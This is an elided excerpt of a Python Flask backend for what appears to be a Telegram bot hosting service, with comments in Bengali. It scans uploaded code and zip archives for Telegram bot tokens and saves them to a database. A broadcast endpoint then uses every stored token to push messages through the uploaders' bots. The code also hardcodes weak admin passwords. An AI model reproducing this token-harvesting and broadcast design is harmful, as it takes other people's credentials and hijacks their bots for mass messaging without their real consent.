...
# Admin Configuration
ADMIN_USER = "admin"
ADMIN_PASS = "2010"      # Admin Panel Password
DASHBOARD_PASS = "2310"  # Dashboard Lock Password
...
def init_db():
    ...
    c = conn.cursor()
    # users টেবিলে এখন bot_token কলাম যুক্ত হয়েছে
...
def extract_token_from_code(file_path):
    """Python কোড থেকে বট টোকেন খুঁজে বের করার লজিক"""
    try:
        with open(file_path, 'r', errors='ignore') as f:
            content = f.read()
        
        # Regex Pattern for Telegram Bot Token
        # এটি '123456:ABC-DEF...' ফরম্যাট খুঁজে
...
def home():
    return jsonify({
        "status": "Running",
        "message": "Host Pro Max Backend V2.0",
        "features": ["Auto Token Detection", "Broadcast System"]
    })
...
def upload():
    ...
    if ext == '.zip':
        try:
            ...
            # Token Scanning after extraction
    ...
    # Update Token in Database if found
    if detected_token:
        try:
            conn = get_db()
...
# --- BROADCAST SYSTEM (Auto Token Enabled) ---
...
def broadcast():
    ...
    # ডাটাবেস থেকে সব ইউজারের টোকেন সংগ্রহ
    conn = get_db()
    ...
    # থ্রেডিং ব্যবহার করে দ্রুত মেসেজ পাঠানো
    def send_message_thread(token):
        ...
        try:
            ...
            print(f"Failed for token {token[:5]}: {e}")
            failed_count += 1
    ...
    # সব থ্রেড শেষ হওয়া পর্যন্ত অপেক্ষা (ঐচ্ছিক, বা ব্যাকগ্রাউন্ডে চলতে দিতে পারেন)
    # for t in threads: t.join() 

    return jsonify({
        "status": "Broadcasting Started", 
        "total_targets": len(threads),
        "message": "Messages are sending in background"
    })
